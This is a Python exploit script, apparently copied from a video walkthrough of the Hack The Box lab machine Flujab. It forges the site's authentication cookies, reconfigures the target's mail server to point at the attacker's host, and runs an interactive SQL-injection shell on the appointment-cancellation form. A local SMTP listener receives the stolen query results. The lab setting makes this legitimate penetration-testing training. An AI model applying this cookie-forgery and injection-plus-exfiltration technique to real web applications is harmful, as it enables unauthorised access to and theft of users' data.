#
# Code from Ippsec Flujab HTB YouTube Video
#
# Flujab YouTube https://youtu.be/_f9Xygr-qHU
#

from smtpd import SMTPServer
from cmd import Cmd
import requests
import asyncore
import threading
import re
import urllib3
import hashlib
import base64

# suppress the SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LHOST = "10.10.14.27"

# cookies based on local IP address

patient    = hashlib.md5(LHOST.encode("utf-8")).hexdigest()
registered = base64.b64encode(f"{patient}=True".encode("utf-8")).decode("utf-8")
modus      = base64.b64encode("Configure=True".encode("utf-8")).decode("utf-8")

# configure smtp server to be our box

def init_smtp():

    print(f"[+] Registering SMTP settings: {LHOST}:25")

    cookies = {"Patient": patient, "Registered": registered, "Modus": modus}

    data = {"mailserver": LHOST, "port": "25","save":"Save Mail Server Config"}
    r = requests.post('https://freeflujab.htb/?smtp_config', data=data, cookies=cookies, verify=False)
    print(r.status_code)
    

class Terminal(Cmd):
    prompt = "pleaseSubscribe => "

    def inject(self, args):
        payload = f"' {args} -- -"
        data = {"nhsnum": payload, "submit": "Cancel Appointment"}
        cookies = {"Patient": patient, "Registered": registered, "Modus": modus}        

        r = requests.post('https://freeflujab.htb/?cancel', data=data, cookies=cookies, verify=False)
    
    def default(self, args):
        self.inject(args)

    # run when necessary     
    def do_initsmtp(self, args):
        init_smtp()

class EmailServer(SMTPServer):
    def process_message(self, peer, mailfrom, rcptos, data, **kwargs):
        response = str(data, "utf-8")
        data = re.findall(r'- Ref:(.*)', response)
        print(data[0])

def mail():
    EmailServer(('0.0.0.0',25), None)
    asyncore.loop()


threads = []
t = threading.Thread(target=mail)
threads.append(t)
t.start()
term = Terminal()
term.cmdloop()

